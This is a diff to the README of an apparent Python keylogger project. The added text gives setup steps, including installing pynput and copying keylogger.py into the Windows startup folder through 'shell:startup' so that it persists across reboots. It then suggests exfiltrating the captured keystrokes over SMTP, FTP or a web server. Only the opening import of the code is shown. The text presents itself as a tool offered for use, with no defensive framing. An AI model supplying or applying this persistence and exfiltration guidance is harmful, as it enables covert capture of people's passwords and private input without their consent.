@@ -1,8 +1,17 @@
 # python3_Keylogger
 python3 keylogger
 
-install 
-python -m pip install pynput
+1) install python 3 then install pynput with following command
+> python -m pip install pynput
+2) output was automatically saved on script directory that was running
+3) Use Shell as follow
+  3-1) win+R
+  3-2) paste shell:startup then enter
+  3-3) copy keylogger.py in folder that apeared before
+  3-4) change dir to different location
+
+> you can use SMTP Email or FTP Client or Web Server to get KeyStroke
+> Good Luck!
 
 ```python
 from pynput.keyboard import Key, Listener
